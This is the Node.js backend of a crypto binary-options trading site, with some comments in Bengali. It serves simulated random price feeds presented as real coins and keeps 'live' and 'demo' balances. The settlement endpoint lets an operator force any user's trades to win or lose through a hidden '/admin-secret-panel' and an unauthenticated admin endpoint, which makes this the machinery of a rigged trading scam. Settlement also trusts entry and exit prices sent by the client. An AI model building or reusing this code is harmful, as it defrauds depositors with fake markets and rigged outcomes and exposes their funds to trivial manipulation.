const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const path = require('path');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

let users = {
  "demo_user": { liveBalance: 10.00, demoBalance: 11072.87, activeAccount: "demo", control: "normal" }
};

let ASSETS = {
  'BTC':  { name: 'Bitcoin', ticker: 'BTC', price: 68520.50, decimals: 2, payout: 92, vol: 2.2 },
  'ETH':  { name: 'Ethereum', ticker: 'ETH', price: 3422.00, decimals: 2, payout: 90, vol: 0.5 },
  'SOL':  { name: 'Solana', ticker: 'SOL', price: 177.50, decimals: 2, payout: 88, vol: 0.10 },
  'BNB':  { name: 'BNB', ticker: 'BNB', price: 591.20, decimals: 2, payout: 88, vol: 0.18 },
  'XRP':  { name: 'XRP', ticker: 'XRP', price: 0.6250, decimals: 4, payout: 85, vol: 0.0003 },
  'DOGE': { name: 'Dogecoin', ticker: 'DOGE', price: 0.1425, decimals: 4, payout: 82, vol: 0.00015 },
  'TON':  { name: 'Toncoin', ticker: 'TON', price: 5.850, decimals: 3, payout: 86, vol: 0.003 },
  'ADA':  { name: 'Cardano', ticker: 'ADA', price: 0.4850, decimals: 4, payout: 84, vol: 0.0003 }
};

let candleHistories = {};
let currentCandleMinute = Math.floor(Date.now() / 60000) * 60;

// প্রতিটি কয়েনের সম্পূর্ণ অবিচ্ছিন্ন (Continuous) হিস্ট্রি তৈরি
function initMarketHistory() {
  for (let key in ASSETS) {
    let meta = ASSETS[key];
    let list = [];
    let p = meta.price;

    for (let i = 400; i > 0; i--) {
      let t = currentCandleMinute - (i * 60);
      let o = p;
      let delta = (Math.random() - 0.495) * meta.vol;
      let c = parseFloat((o + delta).toFixed(meta.decimals));
      let h = parseFloat((Math.max(o, c) + Math.random() * meta.vol * 0.4).toFixed(meta.decimals));
      let l = parseFloat((Math.min(o, c) - Math.random() * meta.vol * 0.4).toFixed(meta.decimals));
      list.push({ time: t, open: o, high: h, low: l, close: c });
      p = c;
    }

    meta.price = p;
    list.push({
      time: currentCandleMinute,
      open: meta.price,
      high: meta.price,
      low: meta.price,
      close: meta.price
    });

    candleHistories[key] = list;
  }
}
initMarketHistory();

// লাইভ মার্কেট টিক
setInterval(() => {
  let now = Date.now();
  let sec = Math.floor(now / 1000);
  let nowMinute = Math.floor(sec / 60) * 60;
  let remainingSec = 60 - (sec % 60);

  let isNewMinute = (nowMinute > currentCandleMinute);

  for (let key in ASSETS) {
    let meta = ASSETS[key];
    let delta = (Math.random() - 0.495) * (meta.vol * 0.35);
    meta.price = parseFloat((meta.price + delta).toFixed(meta.decimals));

    let list = candleHistories[key];
    let lastCandle = list[list.length - 1];

    if (isNewMinute) {
      list.push({
        time: nowMinute,
        open: meta.price,
        high: meta.price,
        low: meta.price,
        close: meta.price
      });
      if (list.length > 800) list.shift();
    } else {
      if (meta.price > lastCandle.high) lastCandle.high = meta.price;
      if (meta.price < lastCandle.low) lastCandle.low = meta.price;
      lastCandle.close = meta.price;
    }
  }

  if (isNewMinute) currentCandleMinute = nowMinute;

  let tickPayload = {
    type: 'TICK',
    countdown: remainingSec,
    serverTime: now,
    assets: {}
  };

  for (let key in ASSETS) {
    let list = candleHistories[key];
    tickPayload.assets[key] = {
      price: ASSETS[key].price.toFixed(ASSETS[key].decimals),
      candle: list[list.length - 1],
      payout: ASSETS[key].payout
    };
  }

  let broadcastData = JSON.stringify(tickPayload);
  wss.clients.forEach(client => {
    if (client.readyState === WebSocket.OPEN) client.send(broadcastData);
  });
}, 1000);

app.get('/api/history/:asset', (req, res) => {
  let asset = req.params.asset || 'BTC';
  if (candleHistories[asset]) {
    res.json({
      success: true,
      history: candleHistories[asset],
      meta: ASSETS[asset]
    });
  } else {
    res.json({ success: false });
  }
});

app.post('/api/trade', (req, res) => {
  const { username, amount, direction, accountType, durationSec, asset } = req.body;
  let user = users[username] || users["demo_user"];
  let tradeAmount = Number(amount) || 1;
  let targetBal = accountType === 'live' ? user.liveBalance : user.demoBalance;

  if (targetBal < tradeAmount) return res.json({ success: false, message: "Insufficient balance!" });

  if (accountType === 'live') user.liveBalance -= tradeAmount;
  else user.demoBalance -= tradeAmount;

  let selectedAsset = ASSETS[asset] || ASSETS['BTC'];
  res.json({
    success: true,
    entryPrice: selectedAsset.price.toFixed(selectedAsset.decimals),
    balance: (accountType === 'live' ? user.liveBalance : user.demoBalance).toFixed(2),
    direction,
    amount: tradeAmount,
    durationSec,
    asset
  });
});

app.post('/api/settle-trade', (req, res) => {
  const { username, entryPrice, exitPrice, direction, amount, accountType, asset } = req.body;
  let user = users[username] || users["demo_user"];
  let selectedAsset = ASSETS[asset] || ASSETS['BTC'];
  let tradeAmount = Number(amount) || 1;

  let isWin = false;
  if (user.control === 'win') isWin = true;
  else if (user.control === 'loss') isWin = false;
  else {
    if (direction === 'UP') isWin = (Number(exitPrice) > Number(entryPrice));
    else if (direction === 'DOWN') isWin = (Number(exitPrice) < Number(entryPrice));
  }

  let profit = isWin ? parseFloat((tradeAmount * (1 + selectedAsset.payout / 100)).toFixed(2)) : 0;
  if (isWin) {
    if (accountType === 'live') user.liveBalance += profit;
    else user.demoBalance += profit;
  }

  res.json({
    success: true,
    isWin,
    profit,
    balance: (accountType === 'live' ? user.liveBalance : user.demoBalance).toFixed(2)
  });
});

// আর্লি ক্যাশআউট (Sell the trade) API
app.post('/api/sell-trade', (req, res) => {
  const { username, amount, accountType } = req.body;
  let user = users[username] || users["demo_user"];
  let refundAmt = parseFloat((Number(amount) * 0.25).toFixed(2));

  if (accountType === 'live') user.liveBalance += refundAmt;
  else user.demoBalance += refundAmt;

  res.json({
    success: true,
    refund: refundAmt,
    balance: (accountType === 'live' ? user.liveBalance : user.demoBalance).toFixed(2)
  });
});

app.post('/api/switch-account', (req, res) => {
  const { username, type } = req.body;
  let user = users[username] || users["demo_user"];
  user.activeAccount = type;
  res.json({ success: true, activeAccount: type, balance: type === 'live' ? user.liveBalance : user.demoBalance });
});

app.post('/api/reset-demo', (req, res) => {
  let user = users["demo_user"];
  user.demoBalance = 11072.87;
  res.json({ success: true, balance: user.demoBalance.toFixed(2) });
});

app.get('/api/user/info', (req, res) => {
  let user = users["demo_user"];
  res.json({ liveBalance: user.liveBalance, demoBalance: user.demoBalance, activeAccount: user.activeAccount });
});

app.get(['/admin', '/admin-secret-panel'], (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

app.get('/api/admin/data', (req, res) => {
  res.json({ users, assets: ASSETS });
});

app.post('/api/admin/action', (req, res) => {
  const { username, action, value } = req.body;
  if (users[username]) {
    if (action === 'control') users[username].control = value;
    res.json({ success: true });
  } else res.json({ success: false });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Trading Engine running on port ${PORT}`));
